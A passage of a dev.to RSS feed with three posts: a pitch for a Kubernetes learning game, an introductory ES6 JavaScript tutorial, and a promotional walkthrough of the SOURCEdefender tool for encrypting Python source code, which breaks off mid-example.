      <link>https://dev.to/opsdrill/why-is-learning-kubernetes-so-intimidating-1hco</link>
      <guid>https://dev.to/opsdrill/why-is-learning-kubernetes-so-intimidating-1hco</guid>
      <description>&lt;p&gt;During customer interviews, while I was building OpsDrill, I was shocked by something. Very talented DevOps folks were having a hard time learning Kubernetes.&lt;/p&gt;

&lt;p&gt;“I’ve been dragging my feet on learning”&lt;/p&gt;

&lt;p&gt;“I’ve started and given up 3 times”&lt;/p&gt;

&lt;p&gt;“I don’t know where to start, afraid it will mess up my laptop”&lt;/p&gt;

&lt;p&gt;“It’s overwhelming”&lt;/p&gt;

&lt;p&gt;I was relieved to hear this as I also found it intimidating.&lt;/p&gt;

&lt;p&gt;There is a lot of great free tutorials out there, but some of it feels like jumping straight into “Kubernetes 301: PhD in Containerology”.&lt;/p&gt;

&lt;p&gt;(&lt;a href="https://github.com/kelseyhightower/kubernetes-the-hard-way"&gt;Kubernetes the Hard Way&lt;/a&gt; I’m looking at you. An amazing resource, but a very steep on-ramp for busy DevOps folks.)&lt;/p&gt;

&lt;p&gt;In the past I’ve built games for learning as well as spaced repetition apps for helping to memorize materials. Would you be interested in&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;An adventure game&lt;/li&gt;
&lt;li&gt;Played 15 minutes a day&lt;/li&gt;
&lt;li&gt;Using real Kubernetes commands&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;To really, finally, learn Kubernetes?&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--urg3yddG--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y0catm5ugb65qfo85iic.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--urg3yddG--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y0catm5ugb65qfo85iic.jpg" alt="Pirates of the Kubernetes mockup of a game played with real kubernetes commands"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#pirates-of-the-kubernetes-waitlist-for-early-access"&gt;
  &lt;/a&gt;
  Pirates of the Kubernetes waitlist for early access
&lt;/h3&gt;

&lt;p&gt;Join at &lt;a href="https://piratesofthekubernetes.com"&gt;https://piratesofthekubernetes.com&lt;/a&gt;&lt;/p&gt;

</description>
      <category>kubernetes</category>
      <category>devops</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>Getting started with ECMAScript6</title>
      <author>Christopher Glikpo</author>
      <pubDate>Fri, 25 Jun 2021 19:48:38 +0000</pubDate>
      <link>https://dev.to/cglikpo/getting-started-with-ecmascript6-d0i</link>
      <guid>https://dev.to/cglikpo/getting-started-with-ecmascript6-d0i</guid>
      <description>&lt;h2&gt;
  &lt;a href="#introduction"&gt;
  &lt;/a&gt;
  Introduction
&lt;/h2&gt;

&lt;p&gt;ECMAScript6  is also known as ECMAScript2015.ES6 is a significant upgrade to ES5 and adds a slew of new capabilities to JavaScript.&lt;/p&gt;

&lt;p&gt;In this article, we'll walk through how to set things up to develop ES6 applications and get started with some of the most important new features.&lt;/p&gt;

&lt;p&gt;This article covers:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Browser support&lt;/li&gt;
&lt;li&gt;Setting up Babel and webpack&lt;/li&gt;
&lt;li&gt;Code editors&lt;/li&gt;
&lt;li&gt;Modules&lt;/li&gt;
&lt;li&gt;const and let&lt;/li&gt;
&lt;li&gt;Classes&lt;/li&gt;
&lt;li&gt;Object literal syntax&lt;/li&gt;
&lt;li&gt;Destructuring assignment&lt;/li&gt;
&lt;li&gt;Arrow functions&lt;/li&gt;
&lt;li&gt;Template strings&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#browser-support"&gt;
  &lt;/a&gt;
  Browser support
&lt;/h2&gt;

&lt;p&gt;The setup necessary for building ES6 apps is determined by the amount of cross-platform compatibility you wish to give. Most of ES6 is already supported by the latest versions of Chrome, Firefox, Edge, and Node.js, so if you're just targeting these newer runtimes, you can start using it right now.For further details about which runtimes support which features, you can consult the &lt;a href="http://kangax.github.io/compat-table/es6/"&gt;ES6 compatibility table.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can run the following code in your browser's JavaScript console. If your browser supports ES6, it should evaluate to &lt;code&gt;3&lt;/code&gt;. If not, it will complain about a syntax error.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;let [two, three] = [2, 3];
two + three;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Unfortunately, the general browser market may be out of date, meaning that many users are still not using an ES6-compatible browser. If you're developing a public-facing online application, you should continue to assist these individuals.&lt;/p&gt;

&lt;p&gt;Fortunately, there's a project called &lt;a href="https://babeljs.io/"&gt;Babel&lt;/a&gt; which allows you to convert your ES6 code into ES5 code. This means that you can still write code in ES6 while developing web applications that anybody with an ES5-compliant browser can use. It takes some effort to figure out how to set everything up the first time, so I've included a step-by-step guide below to help you get started more quickly.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#setting-up-babel-and-webpack"&gt;
  &lt;/a&gt;
  Setting up Babel and webpack
&lt;/h2&gt;

&lt;p&gt;If you do not already have Node.js installed, you will need to &lt;a href="https://nodejs.org/en/"&gt;install it&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Create a folder for your project, then create a file named &lt;code&gt;package.json&lt;/code&gt; with the following content:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
  "name": "es6-demo",
  "scripts": {
    "build": "webpack --watch"
  },
  "devDependencies": {
    "babel-cli": "^6.8.0",
    "babel-core": "^6.8.0",
    "babel-loader": "^6.2.4",
    "babel-plugin-transform-runtime": "^6.8.0",
    "babel-preset-es2015": "^6.6.0",
    "babel-runtime": "^6.6.1",
    "webpack": "^1.13.0"
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Then create a file named &lt;code&gt;webpack.config.js&lt;/code&gt; with the following content:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var path = require("path");
module.exports = {
  entry: "./src/main.js",
  output: {
    path: __dirname,
    filename: "bundle.js"
  },
  module: {
    loaders: [
      {
        loader: "babel-loader",

        // Compile files in /src directory
        include: [path.resolve(__dirname, "src")],

        // Babel options
        query: {
          plugins: ["transform-runtime"],
          presets: ["es2015"]
        }
      }
    ]
  }
};
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Then create a subfolder named &lt;code&gt;src&lt;/code&gt;. This folder will contain all of your ES6 code. Let's put a simple script there named &lt;code&gt;main.js&lt;/code&gt; just to test things out.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;let [one, two, three] = [1, 2, 3];
console.log(`One: ${one}, Two: ${two}, Three: ${three}`);
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Open your terminal (Node.js console for Windows users), navigate to your project folder, and run the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;npm install
npm run build
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will create a &lt;code&gt;bundle.js&lt;/code&gt; file in your project folder with the compiled ES5 code. If you open this file, you'll see the ES5 equivalent (in the middle of a bunch of other generated boilerplate):&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var one = 1;
var two = 2;
var three = 3;

console.log("One: " + one + ", Two: " + two + ", Three: " + three);
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The &lt;code&gt;npm run build&lt;/code&gt; script is set up to listen for modifications in the &lt;code&gt;src&lt;/code&gt; folder. Now, when you modify the &lt;code&gt;main.js&lt;/code&gt; file, the &lt;code&gt;bundle.js&lt;/code&gt; file will update automatically. You can stop watching with &lt;code&gt;Ctrl&lt;/code&gt; + &lt;code&gt;C&lt;/code&gt; in the console.&lt;/p&gt;

&lt;p&gt;After you've done this, there's no need to run &lt;code&gt;npm install&lt;/code&gt; again. When you need to convert your code, you can use &lt;code&gt;npm run build&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#code-editors"&gt;
  &lt;/a&gt;
  Code editors
&lt;/h2&gt;

&lt;p&gt;For a better development experience, you also will probably want to use a code editor that has some ES6 tooling. I like to use &lt;code&gt;Visual Studio Code&lt;/code&gt;, but there are many editors that can be set up to support ES6, such as &lt;code&gt;vim&lt;/code&gt;, &lt;code&gt;Atom&lt;/code&gt;,&lt;code&gt;Sublime Text&lt;/code&gt;, and &lt;code&gt;WebStorm&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#modules"&gt;
  &lt;/a&gt;
  Modules
&lt;/h2&gt;

&lt;p&gt;In my opinion, the module is the single most important new feature in ES6. It allows you to separate your code into separate files in a modular way without worrying about cluttering the global namespace.&lt;/p&gt;

&lt;p&gt;For example, let's create a file &lt;code&gt;math.js&lt;/code&gt; with a toy math library that exports the value of pi and a couple of pi-related functions:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;export const PI = 3.141592653589793;
export function circumference(r) {
  return 2 * PI * r;
}
export function area(r) {
  return PI * r * r;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;With modules, we can import this library's individual components from another file:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import { PI, area } from "./math";
console.log(area(PI));
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Or we can import everything into a single object:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import * as math from "./math";
console.log(math.area(math.PI));
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You can also export a single value as the default value, so that you can import it without needing brackets or a &lt;a href="https://whatis.techtarget.com/definition/wildcard-character"&gt;wildcard&lt;/a&gt;:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// reverseString.js
export default function(str) {
  return str
    .split("")
    .reverse()
    .join("");
}
// main.js
import reverseString from "./reverseString";
console.log(reverseString("Hello, world!"));
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#const-and-let"&gt;
  &lt;/a&gt;
  const and let
&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;const&lt;/code&gt; is used for constant declarations, and &lt;code&gt;let&lt;/code&gt; is used for variable declarations.&lt;/p&gt;

&lt;p&gt;If you try to reassign to a constant, the compiler will throw an error:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const one = 1;
one = 2; // SyntaxError: "one" is read-only
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;code&gt;let&lt;/code&gt; is similar to &lt;code&gt;var&lt;/code&gt;, but it fixes a number of quirks about &lt;code&gt;var&lt;/code&gt; that are often stumbling blocks to JavaScript newcomers. In fact, &lt;code&gt;var&lt;/code&gt; has become obsolete at this point because it's &lt;code&gt;let&lt;/code&gt; and &lt;code&gt;const&lt;/code&gt; have assumed its functionality.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;let&lt;/code&gt; is block-scoped&lt;br&gt;
&lt;code&gt;var&lt;/code&gt; and &lt;code&gt;let&lt;/code&gt; differ in their scoping mechanisms. A variable declared with &lt;code&gt;var&lt;/code&gt; is function-scoped, which means that it is visible anywhere in the surrounding function. Meanwhile, a variable declared with &lt;code&gt;let&lt;/code&gt; is block-scoped, which means it is only visible in its own code block. Calls to the variable outside its code block will lead to errors.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// var
console.log(less); // undefined
if (1 &amp;lt; 2) {
  var less = true;
  console.log(less); // true
}
console.log(less); // true

// let
console.log(less); // Uncaught ReferenceError: less is not defined
if (1 &amp;lt; 2) {
  let less = true;
  console.log(less); // true
}
console.log(less); // Uncaught ReferenceError: less is not defined
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;code&gt;const&lt;/code&gt; also exhibits this block scoping strategy.&lt;/p&gt;

&lt;p&gt;Duplicate &lt;code&gt;let&lt;/code&gt; declarations are forbidden&lt;br&gt;
&lt;code&gt;let&lt;/code&gt; is designed to catch potential assignment mistakes. While duplicate &lt;code&gt;var&lt;/code&gt; declarations will behave like normal reassignment, duplicate &lt;code&gt;let&lt;/code&gt; declarations are not allowed to prevent the common mistake of erroneous reassignment.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var x = 1;
var x = 2; // x equals 2

let x = 1;
let x = 2; // SyntaxError: Identifier 'x' has already been declared
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;code&gt;let&lt;/code&gt; variables rebound in each loop iteration&lt;br&gt;
Here is a common error that occurs when you have a function defined inside of a loop using &lt;code&gt;var&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;for (var i = 0; i &amp;lt; 5; i++) {
  setTimeout(function() {
    console.log(i);
  }, 10);
}
// logs 5 5 5 5 5
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This code will log the number 5 five times in a row, because the value of &lt;code&gt;i&lt;/code&gt; will be 5 before the first time &lt;code&gt;console.log&lt;/code&gt; is called. When we use &lt;code&gt;let&lt;/code&gt; instead, the &lt;code&gt;i&lt;/code&gt; inside of the function will correspond to the value on that particular iteration of the for-loop.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;for (let i = 0; i &amp;lt; 5; i++) {
  setTimeout(() =&amp;gt; {
    console.log(i);
  }, 10);
}
// logs 0 1 2 3 4
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#classes"&gt;
  &lt;/a&gt;
  Classes
&lt;/h2&gt;

&lt;p&gt;Object-oriented programming in JavaScript is different than classical OOP because it uses prototypes rather than classes. ES6 classes are a syntax shortcut for a common JavaScript pattern used to simulate classes. Below, I lay out prototype creation in ES5 and class creation in ES6.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// ES5 way
function Circle(x, y, radius) {
  this.x = x;
  this.y = y;
  this.radius = radius;
}
Circle.prototype.move = function(x, y) {
  this.x = x;
  this.y = y;
};
Circle.prototype.area = function() {
  return Math.PI * Math.pow(this.radius, 2);
};

// ES6 way
class Circle {
  constructor(x, y, radius) {
    [this.x, this.y, this.radius] = [x, y, radius];
  }
  move(x, y) {
    [this.x, this.y] = [x, y];
  }
  area() {
    return Math.PI * Math.pow(this.radius, 2);
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You can also extend classes in a manner consistent to standard object-oriented languages:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// ES5 way
function ColoredCircle(x, y, radius, color) {
  Circle.call(this, x, y, radius);
  this.color = color;
}
ColoredCircle.prototype = Object.create(Circle.prototype);

// ES6 way
class ColoredCircle extends Circle {
  constructor(x, y, radius, color) {
    super(x, y, radius);
    this.color = color;
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#object-literal-syntax"&gt;
  &lt;/a&gt;
  Object literal syntax
&lt;/h2&gt;

&lt;p&gt;It's common to create objects with property names matching variable names. ES6 includes new syntax to make this a little bit more concise:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var x = 5,
  y = 6;

// ES5 way
var coordinate = { x: x, y: y };

// ES6 way
let coordinate = { x, y };
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The syntax for function properties has also changed:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// ES5 way
var counter = {
  count: 0,
  increment: function() {
    this.count++;
  }
};

// ES6 way
let counter = {
  count: 0,
  increment() {
    this.count++;
  }
};
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#destructuring-assignment"&gt;
  &lt;/a&gt;
  Destructuring assignment
&lt;/h2&gt;

&lt;p&gt;Destructuring assignment is a nifty feature for doing several assignments at once. In ES5, you often have a series of variable declarations like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var a = 1,
  b = 2,
  c = 3;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In ES6 you can do it all at once with array destructuring:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;let [a, b, c] = [1, 2, 3];
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This is particularly nice for extracting values from an array:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var personData = ["John", 12, true];

// ES5 way
var name = personData[0],
  age = personData[1],
  isMale = personData[2];
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// ES6 way
let [name, age, isMale] = personData;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and also for swapping variables:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// ES5 way
var tmp = a;
a = b;
b = tmp;

// ES6 way
[a, b] = [b, a];
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Destructuring assignment can be used with objects as well:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var personData = {
  name: "John",
  age: 12,
  isMale: true
};

// ES5 way
var name = personData.name,
  age = personData.age,
  isMale: personData.isMale;

// ES6 way
let { name, age, isMale } = personData;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This also works with nested object structures:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var book = {
  title: "A Tale of Two Cities",
  dimensions: [12, 8, 3],
  author: {
    name: "Charles Dickens"
  }
};

// ES5 way
var title = book.title,
  length = book.dimensions[0],
  width = book.dimensions[1],
  depth = book.dimensions[2],
  name = book.author.name;

// ES6 way
let { title, dimensions: [length, width, depth], author: { name } } = book;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Clear and concise.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#arrow-functions"&gt;
  &lt;/a&gt;
  Arrow functions
&lt;/h2&gt;

&lt;p&gt;JavaScript developers frequently use function expressions, such as callbacks. However, code can often look messy when the keywords function and return are repeated many times. ES6 has new syntax to make function expressions less verbose.&lt;/p&gt;

&lt;p&gt;Let's compare ES6 function expression handling with expression handling in previous Ecmascript versions.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var list = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];

// ES3 way
var sumOfSquares = 0;
for (var i = 0; i &amp;lt; list.length; i++) {
  var n = list[i],
    square = n * n;
  sumOfSquares += square;
}

// ES5 way
var sumOfSquares = list
  .map(function(x) {
    return x * x;
  })
  .reduce(function(a, b) {
    return a + b;
  });

// ES6 way
let sumOfSquares = list.map(x =&amp;gt; x * x).reduce((a, b) =&amp;gt; a + b);
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;For functions consisting of more than one statement, you can wrap the right-hand side of the arrow function in curly braces:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// ES5 way
window.onclick = function(e) {
  if (e.ctrlKey) console.log("Ctrl click");
  else console.log("Normal click");
};

// ES6 way
window.onclick = e =&amp;gt; {
  if (e.ctrlKey) console.log("Ctrl click");
  else console.log("Normal click");
};
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#template-strings"&gt;
  &lt;/a&gt;
  Template strings
&lt;/h2&gt;

&lt;p&gt;There is a new type of string literal that makes it easier to insert dynamic values into strings, and also to deal with multi-line strings. Instead of double quotes or single quotes, &lt;code&gt;template strings are delimited by backticks&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var weight = 80,
    height = 1.8;

// ES5 way
console.log("You are " + height + "m tall and weigh " + weight + "kg.\n" +
"Your BMI is " + weight / (height * height) + ".");

// ES6 way
console.log(`You are ${height}m tall and weigh ${weight}kg.
Your BMI is ${weight / (height * height)}.`);
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#and-much-much-more"&gt;
  &lt;/a&gt;
  ...and much much more
&lt;/h2&gt;

&lt;p&gt;I've tried to cover some of the most important new changes, but there are many other cool new features in ES6 that I don't have space to cover in this article. For more information, you can browse a &lt;a href="http://es6-features.org/"&gt;quick overview of the new features on es6-features.org&lt;/a&gt;, read a &lt;a href="https://exploringjs.com/es6/index.html"&gt;more detailed introduction in the Exploring ES6 book&lt;/a&gt;, and, for even more in-depth details, read the &lt;a href="https://exploringjs.com/es6/index.html"&gt;ECMAScript 2015 Language Specification.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you've reached this point, thank you very much. I hope that this tutorial has been helpful for you and I'll see you all in the next.&lt;/p&gt;

&lt;p&gt;If you  want to learn more about Web Development don't forget to to &lt;a href="https://www.youtube.com/c/ChristopherGlikpo/featured"&gt;follow me on Youtube!&lt;/a&gt;&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>codenewbie</category>
      <category>tutorial</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Encryption for Protecting Python Source Code</title>
      <author>Richard Scott</author>
      <pubDate>Fri, 25 Jun 2021 19:38:04 +0000</pubDate>
      <link>https://dev.to/richard_scott/encryption-for-protecting-python-source-code-4ckg</link>
      <guid>https://dev.to/richard_scott/encryption-for-protecting-python-source-code-4ckg</guid>
      <description>&lt;p&gt;Python is a great programming language, it has so many uses, but one thing that it doesn’t do well is help protect your hard work from others. Python source code is plain-text, which means that anyone with access to your files can see what you wrote. Not great when you’ve just written the latest advancement in artificial intelligence (AI) or the best machine learning (ML) algorithm on the planet.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#why-cant-i-just-distribute-bytecode"&gt;
  &lt;/a&gt;
  Why can’t I just distribute Bytecode?
&lt;/h2&gt;

&lt;p&gt;Python has a great feature where it first compiles your source code into bytecode; this is a low-level platform-independent representation of your source code. Back in the days when computers were slow, this was helpful, but when trying to distribute secure code this is a problem. Most solutions for securing Python code involve the distribution of .pyc files. Now, this isn’t all that bad as it does take some effort to reverse engineer a .pyc file. However, that still leaves the possibility for reverse engineering of the file to take place.&lt;/p&gt;

&lt;p&gt;Bytecode also limits the version of Python your userbase requires to run your code. If your end-users upgrade their Python version then your code may stop working altogether due to the use of pickle; Python’s object serialisation library. This is where &lt;a href="https://sourcedefender.co.uk"&gt;SOURCEdefender&lt;/a&gt; can help. It is a commercial offering that has been written from the ground up to help protect Python code and to overcome some of the issues you face when changing Python versions such as bytecode magic numbers.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#aes-256bit-encryption"&gt;
  &lt;/a&gt;
  AES 256-bit Encryption
&lt;/h2&gt;

&lt;p&gt;Under the hood, SOURCEdefender scrambles your plain-text source code with AES-256 encryption. AES is a symmetric algorithm that uses the same key for both encryption and decryption (the security of an AES system increases exponentially with key length).&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#installation"&gt;
  &lt;/a&gt;
  Installation
&lt;/h2&gt;

&lt;p&gt;The sourcedefender package is available from &lt;a href="https://pypi.org/project/sourcedefender/"&gt;PyPi&lt;/a&gt; and can be installed in the usual way:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ pip3 install sourcedefender
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#how-does-it-work"&gt;
  &lt;/a&gt;
  How does it work?
&lt;/h3&gt;

&lt;p&gt;Let’s have a look at an example of the encryption process:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cat /home/ubuntu/helloworld.py
print("Hello World!")
$
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This is a very basic example, but we do not want anyone to get at our source code. We also don’t want anyone to run this code after 1 hour so when we encrypt the file we can enforce an expiration time of 1 hour from now with the &lt;strong&gt;--ttl&lt;/strong&gt; option and we can delete the plaintext .py file after encryption by adding the &lt;strong&gt;--remove&lt;/strong&gt; option.&lt;/p&gt;

&lt;p&gt;The command would look like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ sourcedefender encrypt --remove --ttl=1h /home/ubuntu/helloworld.py
SOURCEdefender v7.1.14
Processing:
/home/ubuntu/helloworld.py
$
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The &lt;em&gt;--remove&lt;/em&gt; option deletes the original .py file. Make sure you use this so you don’t accidentally distribute the plain-text code. Now the file is encrypted, its contents are as follows:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cat /home/ubuntu/helloworld.pye
-----BEGIN SOURCEDEFENDER FILE-----
GhP6+FOEA;qsm6NrRnXHnlU5E!(pT(E&amp;lt;#t=
GhN0L!7UrbN"Am#(8iPPAG;nm-_4d!F9"*7
T1q4VZdj&amp;gt;uLBghNY)[;Ber^L=*a-I[MA.-4
------END SOURCEDEFENDER FILE------
$
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Once a file has been encrypted, its new extension is .pye so our loader can identify encrypted files. All you need to remember is to include sourcedefender as a Python dependency while packaging your project and import the sourcedefender module before you attempt to import and use your encrypted code.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#importing-packages-amp-modules"&gt;
  &lt;/a&gt;
  Importing packages &amp;amp; modules
&lt;/h3&gt;

&lt;p&gt;The usual import system can still be used and you can import encrypted code from within encrypted code so you don’t need to do anything special with your import statements.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cd /home/ubuntu
$ ls
helloworld.pye
$ python3
&amp;gt;&amp;gt;&amp;gt; import sourcedefender
&amp;gt;&amp;gt;&amp;gt; import helloworld
Hello World!
&amp;gt;&amp;gt;&amp;gt; exit()
$
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Using your own password or salt for encryption.&lt;/p&gt;

&lt;p&gt;It’s easy to use your own encryption password and salt. If you do not set these, we generate unique ones for each file you encrypt. Should you wish to set your own, these can be set from either an Environment variable or as a command option:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ sourcedefender encrypt --remove --password 1234abcd --salt dcba4321 mycode.py
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The following does the exact same thing but sets the password/salt from Environment variables instead of on the command line.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ export SOURCEDEFENDER_PASSWORD="1234abcd"
$ export SOURCEDEFENDER_SALT="dcba4321"
